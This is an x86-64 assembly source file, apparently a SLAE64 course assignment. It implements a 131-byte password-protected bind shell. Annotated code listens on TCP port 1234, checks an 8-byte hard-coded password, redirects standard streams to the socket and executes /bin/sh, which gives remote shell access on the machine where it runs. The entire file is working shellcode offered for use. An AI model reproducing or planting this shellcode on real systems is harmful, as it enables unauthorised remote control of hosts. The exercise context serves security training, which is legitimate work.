; Andrea Bruna SLAE64 - 1493
; Assignment 1 - password protected bind shell  
; Shellcode length 131 bytes
; 
; Bind to port 1234
; Password = "andbruna" 

global _start

section .text

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall = 41

	xor rsi,rsi ; rsi = 0
	mul rsi ; eax and rdx = 0
	push 2
	pop rdi ; rdi = 2
	inc esi ; rsi = 1
	mov al,41 
	syscall ; rax contains "sock"

	; server.sin_family = AF_INET = 2 (word)
	; server.sin_port = htons(1234) = 0xd204 (word)
	; server.sin_addr.s_addr = INADDR_ANY = 0 (dword)
	; 8 empty bytes (1 qword)
	 
	push rdx ; push 0x0000000000000000
	push rdx ; push 0x0000000000000000 
	mov word [rsp+2], 0xd204 ; htons(1234)
	mov byte [rsp], 0x2 ; AF_INET
		; then modify the second qword in  0x00000000d2040002
	
	; bind(sock, (struct sockaddr *)&server, sockaddr_len) 
	; syscall = 49
	
	xchg rdi,rax ; switch rax and rdi so that rdi = sock and eax = 2
	push rsp ;
	pop rsi ; load the addres of the structure in rsi
	mov dl,16 ; rdx = sockaddr_len
	mov al,49
	syscall ; bind

	; listen (sock, 1)
	; syscall = 50
		
	push 1 ; 1 connection is enough :) 
	pop rsi ; rsi = 1
	mov al,50 ; assumes previous bind call was succesful 
	syscall

	; newsock = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall = 43

	push rsp ; theoretically we should reserve 16 bytes for sockaddr client
	pop rsi ; but I will use top of the stack regardless of the contents
	mov byte [rsp-1],dl ; sockaddr_len
	dec rsp ; adjust rsp 
	push rsp
	pop rdx ; put &sockaddr_len in rdx
	mov al, 43 
	syscall ; rax contain "newsock"
	
	
	; close(sock)
	; syscall 3
	; Closing the former socket is not mandatory. Leave commented -> reduce space 
	
	;xchg rdi,rax
	;push 3
	;pop rax
	;syscall

	; n = read(newsock, buffer, 8)
	; syscall 0

	xchg rdi,rax ; newsock in rdi
	xor rax,rax ; clear rax
	cdq ; clear rdx
	push rax ; make space for the buffer in the stack
	push rsp
	pop rsi ; and load its address in rsi
	mov dl,8 ; length of buffer (8 bytes)
	syscall	
	

	push rdi
	push rsi
	; password check. Roughly equivalent to a strcmp except the fixed length (8 bytes)
	; and ignoring the lack of string terminators '\0'
	mov rax,0x616e757262646e61 ; load the password as hexadecimal in "reverse" order
				   ; for a low endian arch 
	pop rdi ; load the "buffer" address to be compared in rdi
	scasq ; compare the string read with the embedded password
	jnz _exit ; if they don't match jump to _exit	
	 

	; i = 3; while (i != 0) { --i; dup2(newsock, i); } 
	; syscall = 33

	pop rdi ; rdi = newsock
	xor rax,rax ; rax = 0
	push 3
	pop rsi ; i = 3 
loop_dup2:
	mov al,33 
	dec esi ; --i
	syscall
	jne loop_dup2 

	; char *arguments[] = { "/bin/sh", 0};
	; execve(arguments[0], 0, 0)
	; syscall 59
	
	; xchg rdi,rcx ; not needed unless we want to close "newsocket" later
	push rsi ; terminates "/bin//sh" string with 0
	mov rbx,0x68732f2f6e69622f 
	push rbx ; command string pushed in reverse order for a low endian arch	
	push rsp 
	pop rdi ; rdi = &arguments[0]
	imul rsi ; rsi, rax and rdx = 0
	mov al,59
	syscall


_exit:

	; close(newsock)
	; syscall = 3
	; Note: Not mandatory. Moreover, even if the socket is closed,
	; the same address/port combination remains unavailable for a while due to TIME_WAIT.
	; Setting SO_REUSEADDR with setsockopt() might be helful but the code size would further increase 
	 
	;xchg rdi,rcx
	;push 3
	;pop rax 
	;syscall
	
	; exit(any_value) 
	; syscall = 60
	; Not vital but exit() prevents segfaults if the strings comparison fails \ 
	; or socket binding/creation fails for any reason.
	; Comment if reducing shellcode size is more important than being "stealth" or "nice" to the OS :)
	
	push 60 ; rax bits between 63 and 8 might be set if jumping here after failing the scasq comparison  
	pop rax ; instead I don't care about the return addr (the value in rdi)
	syscall	; exit gracefully

